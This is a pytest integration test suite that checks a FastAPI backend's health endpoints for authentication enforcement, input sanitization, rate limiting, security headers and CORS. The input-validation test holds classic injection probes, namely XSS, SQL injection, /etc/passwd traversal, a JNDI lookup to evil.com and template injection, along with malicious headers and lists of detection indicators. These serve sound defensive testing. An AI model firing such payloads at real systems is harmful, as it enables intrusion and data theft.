"""
Test Health Endpoint Security Comprehensive - Phase 5 Test Suite

Business Value Justification (BVJ):
- Segment: Platform/Internal, All customer tiers  
- Business Goal: System security and monitoring reliability
- Value Impact: Prevents security breaches and ensures reliable monitoring
- Strategic Impact: Foundation for production monitoring and security

CRITICAL REQUIREMENTS:
- Tests real API endpoint security with authentication
- Validates input sanitization and authorization
- Ensures monitoring data is protected
- No mocks - uses real FastAPI endpoints
"""

import pytest
import httpx
import asyncio
import json
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
import uuid

from test_framework.ssot.base_test_case import SSotBaseTestCase
from test_framework.ssot.e2e_auth_helper import E2EAuthHelper, E2EAuthConfig
from test_framework.ssot.isolated_test_helper import IsolatedTestHelper
from shared.isolated_environment import get_env

from netra_backend.app.api.health_checks import health_router
from netra_backend.app.core.security import get_current_user, verify_api_key


class TestHealthEndpointSecurityComprehensive(SSotBaseTestCase):
    """
    Comprehensive health endpoint security tests.
    
    Tests critical API security that protects business monitoring:
    - Authentication and authorization enforcement
    - Input validation and sanitization  
    - Rate limiting and abuse prevention
    - Sensitive data protection
    - Security headers and CORS
    """
    
    def __init__(self):
        """Initialize health endpoint security test suite."""
        super().__init__()
        self.env = get_env()
        self.isolated_helper = IsolatedTestHelper()
        
        # Test configuration
        self.test_prefix = f"health_security_{uuid.uuid4().hex[:8]}"
        self.base_url = self.env.get("BACKEND_URL", "http://localhost:8000")
        self.health_endpoint = f"{self.base_url}/health"
        
    def setup_auth_helper(self) -> E2EAuthHelper:
        """Set up authentication helper for API tests."""
        auth_config = E2EAuthConfig(
            auth_service_url=self.env.get("AUTH_SERVICE_URL", "http://localhost:8081"),
            backend_url=self.base_url,
            test_user_email=f"{self.test_prefix}@security.test",
            timeout=10.0
        )
        
        return E2EAuthHelper(config=auth_config)
    
    @pytest.mark.integration
    @pytest.mark.real_services
    async def test_health_endpoint_authentication_enforcement(self):
        """
        Test authentication enforcement on health endpoints.
        
        BUSINESS CRITICAL: Unauthenticated access exposes system internals.
        Must require proper authentication for sensitive health data.
        """
        auth_helper = self.setup_auth_helper()
        
        # Test endpoints that should require authentication
        protected_endpoints = [
            "/health/config",          # Configuration details - sensitive
            "/health/cache/clear",     # Administrative operation
            "/health/startup"          # Detailed system information
        ]
        
        # Test public endpoints (should not require auth)
        public_endpoints = [
            "/health",                 # Basic health check
            "/health/database",        # Database status (basic)
            "/health/redis",          # Redis status (basic)
            "/health/clickhouse"      # ClickHouse status (basic)
        ]
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Test unauthenticated access to protected endpoints
            for endpoint in protected_endpoints:
                url = f"{self.base_url}{endpoint}"
                
                response = await client.get(url)
                
                # Should require authentication (401 or 403)
                assert response.status_code in [401, 403], \
                    f"Protected endpoint {endpoint} allows unauthenticated access: {response.status_code}"
                
                # Should not leak sensitive information in error
                response_text = response.text.lower()
                sensitive_terms = ["password", "secret", "token", "key", "connection_string"]
                
                for term in sensitive_terms:
                    assert term not in response_text, \
                        f"Sensitive information '{term}' leaked in auth error for {endpoint}"
            
            # Test public endpoints (should work without auth)
            for endpoint in public_endpoints:
                url = f"{self.base_url}{endpoint}"
                
                response = await client.get(url)
                
                # Should allow access (200 or 503 for service issues)
                assert response.status_code in [200, 503], \
                    f"Public endpoint {endpoint} incorrectly requires auth: {response.status_code}"
                
                # If successful, should return valid health data
                if response.status_code == 200:
                    try:
                        health_data = response.json()
                        assert isinstance(health_data, dict), \
                            f"Health endpoint {endpoint} should return JSON object"
                        
                        # Should not expose sensitive configuration
                        health_json = json.dumps(health_data).lower()
                        sensitive_terms = ["password", "secret", "private_key", "connection_string"]
                        
                        for term in sensitive_terms:
                            assert term not in health_json, \
                                f"Sensitive data '{term}' exposed in public endpoint {endpoint}"
                                
                    except json.JSONDecodeError:
                        pytest.fail(f"Public endpoint {endpoint} returned invalid JSON")
            
            # Test authenticated access to protected endpoints
            # Create valid authentication token
            auth_token = auth_helper.create_test_jwt_token(
                user_id=f"health_test_{uuid.uuid4().hex[:8]}",
                email=f"{self.test_prefix}_auth@security.test",
                permissions=["health_read", "health_admin"]
            )
            
            auth_headers = auth_helper.get_auth_headers(auth_token)
            
            for endpoint in protected_endpoints:
                url = f"{self.base_url}{endpoint}"
                
                if endpoint == "/health/cache/clear":
                    # POST endpoint
                    response = await client.post(url, headers=auth_headers)
                else:
                    # GET endpoint
                    response = await client.get(url, headers=auth_headers)
                
                # Should allow access with valid auth (200 or 500 for system issues)
                assert response.status_code in [200, 500], \
                    f"Authenticated request to {endpoint} failed: {response.status_code}"
                
                # Verify response structure for successful requests
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        if endpoint == "/health/config":
                            assert "environment" in data, "Config endpoint should include environment"
                            assert "services_configured" in data, "Config should include service status"
                            
                        elif endpoint == "/health/startup":
                            assert "system_health" in data, "Startup should include system health"
                            assert "startup_ready" in data, "Startup should include readiness status"
                            
                    except json.JSONDecodeError:
                        if endpoint != "/health/cache/clear":  # Cache clear returns simple message
                            pytest.fail(f"Protected endpoint {endpoint} returned invalid JSON")
    
    @pytest.mark.integration
    @pytest.mark.real_services
    async def test_health_endpoint_input_validation_and_sanitization(self):
        """
        Test input validation and sanitization on health endpoints.
        
        BUSINESS CRITICAL: Improper input handling enables injection attacks.
        Must validate and sanitize all inputs to prevent security breaches.
        """
        auth_helper = self.setup_auth_helper()
        auth_token = auth_helper.create_test_jwt_token(
            user_id=f"validation_test_{uuid.uuid4().hex[:8]}",
            permissions=["health_read", "health_admin"]
        )
        auth_headers = auth_helper.get_auth_headers(auth_token)
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Test query parameter validation
            base_health_url = f"{self.base_url}/health"
            
            # Test valid query parameters
            valid_params = [
                {"force": "true"},
                {"force": "false"},
                {"force": "1"},
                {"force": "0"}
            ]
            
            for params in valid_params:
                response = await client.get(base_health_url, params=params)
                assert response.status_code in [200, 503], \
                    f"Valid parameter {params} rejected: {response.status_code}"
            
            # Test invalid/malicious query parameters
            malicious_params = [
                {"force": "<script>alert('xss')</script>"},
                {"force": "'; DROP TABLE users; --"},
                {"force": "../../../etc/passwd"},
                {"force": "${jndi:ldap://evil.com/a}"},
                {"force": "{{7*7}}"},  # Template injection
                {"force": "\\x00\\x01\\x02"},  # Null bytes
                {"invalid_param": "value"},
                {"force": "x" * 10000}  # Excessive length
            ]
            
            for params in malicious_params:
                response = await client.get(base_health_url, params=params)
                
                # Should handle malicious input gracefully
                assert response.status_code in [200, 400, 503], \
                    f"Malicious parameter {list(params.keys())[0]} caused server error: {response.status_code}"
                
                # Response should not reflect injected content
                response_text = response.text.lower()
                
                malicious_indicators = [
                    "<script>", "alert(", "drop table", 
                    "etc/passwd", "jndi:", "${", "{{", "\\x00"
                ]
                
                for indicator in malicious_indicators:
                    assert indicator not in response_text, \
                        f"Malicious content '{indicator}' reflected in response"
            
            # Test HTTP method validation
            endpoints_methods = [
                ("/health", ["GET"]),
                ("/health/database", ["GET"]),
                ("/health/cache/clear", ["POST"])
            ]
            
            invalid_methods = ["PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
            
            for endpoint, allowed_methods in endpoints_methods:
                url = f"{self.base_url}{endpoint}"
                
                for method in invalid_methods:
                    if method not in allowed_methods:
                        response = await client.request(method, url, headers=auth_headers)
                        
                        # Should reject invalid methods
                        assert response.status_code == 405, \
                            f"Endpoint {endpoint} incorrectly allows {method}: {response.status_code}"
            
            # Test header injection prevention
            malicious_headers = {
                "X-Forwarded-For": "127.0.0.1, <script>alert('xss')</script>",
                "User-Agent": "Mozilla/5.0 '; DROP TABLE sessions; --",
                "Referer": "http://evil.com/{{7*7}}",
                "X-Real-IP": "../../../etc/passwd"
            }
            
            malicious_headers.update(auth_headers)
            
            response = await client.get(base_health_url, headers=malicious_headers)
            
            # Should process request despite malicious headers
            assert response.status_code in [200, 503], \
                f"Malicious headers caused failure: {response.status_code}"
            
            # Should not reflect header content in response
            response_text = response.text.lower()
            header_content = ["<script>", "drop table", "{{", "etc/passwd"]
            
            for content in header_content:
                assert content not in response_text, \
                    f"Header injection content '{content}' reflected in response"
    
    @pytest.mark.integration
    @pytest.mark.real_services
    async def test_health_endpoint_rate_limiting_and_abuse_prevention(self):
        """
        Test rate limiting and abuse prevention on health endpoints.
        
        BUSINESS CRITICAL: Unlimited requests enable DoS attacks.
        Must implement rate limiting to protect system availability.
        """
        auth_helper = self.setup_auth_helper()
        auth_token = auth_helper.create_test_jwt_token(
            user_id=f"rate_limit_test_{uuid.uuid4().hex[:8]}",
            permissions=["health_read"]
        )
        auth_headers = auth_helper.get_auth_headers(auth_token)
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Test normal request rate (should succeed)
            health_url = f"{self.base_url}/health"
            
            normal_requests = []
            for i in range(5):  # Normal rate: 5 requests
                response = await client.get(health_url, headers=auth_headers)
                normal_requests.append(response.status_code)
                await asyncio.sleep(1.0)  # 1 second between requests
            
            # All normal-rate requests should succeed
            successful_normal = sum(1 for status in normal_requests if status == 200)
            assert successful_normal >= 4, \
                f"Normal rate requests failing: {successful_normal}/5 successful"
            
            # Test rapid request burst (may trigger rate limiting)
            burst_responses = []
            burst_start = datetime.now()
            
            for i in range(20):  # Burst: 20 rapid requests
                response = await client.get(health_url, headers=auth_headers)
                burst_responses.append({
                    "status": response.status_code,
                    "time": datetime.now(),
                    "headers": dict(response.headers)
                })
                # Minimal delay to simulate rapid requests
                await asyncio.sleep(0.1)
            
            burst_duration = (datetime.now() - burst_start).total_seconds()
            
            # Analyze burst response patterns
            success_count = sum(1 for r in burst_responses if r["status"] == 200)
            rate_limited_count = sum(1 for r in burst_responses if r["status"] == 429)
            
            # Should have some rate limiting for bursts (or all succeed if no limiting)
            assert success_count + rate_limited_count == 20, \
                f"Unexpected status codes in burst test: success={success_count}, limited={rate_limited_count}"
            
            # If rate limiting is implemented, should have appropriate headers
            if rate_limited_count > 0:
                rate_limited_response = next(r for r in burst_responses if r["status"] == 429)
                headers = rate_limited_response["headers"]
                
                # Should include rate limit information
                rate_limit_headers = [
                    "x-ratelimit-limit", "x-ratelimit-remaining", 
                    "x-ratelimit-reset", "retry-after"
                ]
                
                has_rate_limit_header = any(
                    header in headers for header in rate_limit_headers
                )
                
                assert has_rate_limit_header, \
                    "Rate limited response missing rate limit headers"
            
            # Test different endpoints for consistent rate limiting
            endpoints_to_test = [
                "/health/database",
                "/health/redis", 
                "/health/clickhouse"
            ]
            
            for endpoint in endpoints_to_test:
                url = f"{self.base_url}{endpoint}"
                
                # Test burst on each endpoint
                endpoint_responses = []
                for i in range(10):
                    response = await client.get(url, headers=auth_headers)
                    endpoint_responses.append(response.status_code)
                    await asyncio.sleep(0.2)
                
                # Should handle requests consistently
                success_rate = sum(1 for status in endpoint_responses if status in [200, 503]) / len(endpoint_responses)
                assert success_rate >= 0.5, \
                    f"Endpoint {endpoint} too restrictive: {success_rate:.1%} success rate"
            
            # Test authenticated vs unauthenticated rate limits
            unauth_responses = []
            
            for i in range(10):
                # No auth headers
                response = await client.get(health_url)
                unauth_responses.append(response.status_code)
                await asyncio.sleep(0.2)
            
            unauth_success_rate = sum(1 for status in unauth_responses if status in [200, 503]) / len(unauth_responses)
            
            # Unauthenticated requests might have stricter limits
            assert unauth_success_rate >= 0.3, \
                f"Unauthenticated rate limiting too strict: {unauth_success_rate:.1%} success rate"
    
    @pytest.mark.integration
    @pytest.mark.real_services
    async def test_health_endpoint_security_headers_and_cors(self):
        """
        Test security headers and CORS configuration.
        
        BUSINESS CRITICAL: Missing security headers enable various attacks.
        Must implement proper security headers and CORS policies.
        """
        auth_helper = self.setup_auth_helper()
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Test security headers on health endpoint
            health_url = f"{self.base_url}/health"
            response = await client.get(health_url)
            
            assert response.status_code in [200, 503], \
                f"Health endpoint failed: {response.status_code}"
            
            headers = response.headers
            
            # Essential security headers
            security_headers_checks = [
                {
                    "header": "X-Content-Type-Options",
                    "expected": "nosniff",
                    "critical": True
                },
                {
                    "header": "X-Frame-Options", 
                    "expected_values": ["DENY", "SAMEORIGIN"],
                    "critical": True
                },
                {
                    "header": "X-XSS-Protection",
                    "expected": "1; mode=block",
                    "critical": False  # Deprecated but good to have
                },
                {
                    "header": "Content-Security-Policy",
                    "must_contain": ["default-src"],
                    "critical": True
                },
                {
                    "header": "Strict-Transport-Security",
                    "must_contain": ["max-age"],
                    "critical": False  # Only for HTTPS
                }
            ]
            
            missing_critical_headers = []
            
            for check in security_headers_checks:
                header_name = check["header"]
                header_value = headers.get(header_name, "").lower()
                
                if "expected" in check:
                    if header_value != check["expected"].lower():
                        if check["critical"]:
                            missing_critical_headers.append(f"{header_name}: expected '{check['expected']}', got '{header_value}'")
                
                elif "expected_values" in check:
                    if not any(expected.lower() in header_value for expected in check["expected_values"]):
                        if check["critical"]:
                            missing_critical_headers.append(f"{header_name}: should contain one of {check['expected_values']}, got '{header_value}'")
                
                elif "must_contain" in check:
                    if not any(keyword in header_value for keyword in check["must_contain"]):
                        if check["critical"]:
                            missing_critical_headers.append(f"{header_name}: should contain {check['must_contain']}, got '{header_value}'")
            
            # Assert critical security headers are present
            assert len(missing_critical_headers) == 0, \
                f"Critical security headers missing: {missing_critical_headers}"
            
            # Test CORS headers
            cors_origins_to_test = [
                "https://app.netra.ai",      # Production origin
                "https://staging.netra.ai",  # Staging origin
                "http://localhost:3000",     # Development origin
                "https://evil.com"           # Malicious origin
            ]
            
            for origin in cors_origins_to_test:
                cors_headers = {
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "authorization,content-type"
                }
                
                # Preflight request
                preflight_response = await client.options(health_url, headers=cors_headers)
                
                cors_response_headers = preflight_response.headers
                allowed_origin = cors_response_headers.get("Access-Control-Allow-Origin", "")
                
                if origin.endswith("netra.ai") or origin.startswith("http://localhost"):
                    # Should allow legitimate origins
                    assert allowed_origin in [origin, "*"], \
                        f"Legitimate origin {origin} not allowed: {allowed_origin}"
                
                elif origin == "https://evil.com":
                    # Should reject malicious origins
                    assert allowed_origin != origin, \
                        f"Malicious origin {origin} incorrectly allowed"
                
                # Check CORS security
                if "Access-Control-Allow-Credentials" in cors_response_headers:
                    # If credentials allowed, origin should be specific (not *)
                    if cors_response_headers["Access-Control-Allow-Credentials"].lower() == "true":
                        assert allowed_origin != "*", \
                            "CORS allows credentials with wildcard origin - security risk"
            
            # Test for information disclosure in headers
            all_headers_text = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
            
            # Should not expose sensitive server information
            sensitive_info = [
                "server: apache", "server: nginx", "server: iis",  # Server versions
                "x-powered-by:",  # Technology disclosure
                "x-aspnet-version", "x-aspnetmvc-version",  # Framework versions
                "set-cookie:",  # Session cookies (in health endpoint)
            ]
            
            exposed_info = [info for info in sensitive_info if info in all_headers_text]
            
            assert len(exposed_info) == 0, \
                f"Sensitive server information exposed in headers: {exposed_info}"
            
            # Test response body doesn't leak sensitive information
            if response.status_code == 200:
                try:
                    health_data = response.json()
                    health_text = json.dumps(health_data).lower()
                    
                    # Should not expose internal paths, credentials, or system details
                    sensitive_patterns = [
                        "/home/", "/etc/", "/var/", "/usr/",  # File paths
                        "password", "secret", "key", "token",  # Credentials
                        "internal ip", "private key",  # Network info
                        "stack trace", "exception",  # Error details
                    ]
                    
                    leaked_info = [pattern for pattern in sensitive_patterns if pattern in health_text]
                    
                    assert len(leaked_info) == 0, \
                        f"Sensitive information leaked in health response: {leaked_info}"
                        
                except json.JSONDecodeError:
                    pass  # Skip JSON validation for non-JSON responses


if __name__ == "__main__":
    # Allow running individual tests  
    pytest.main([__file__, "-v", "--tb=short"])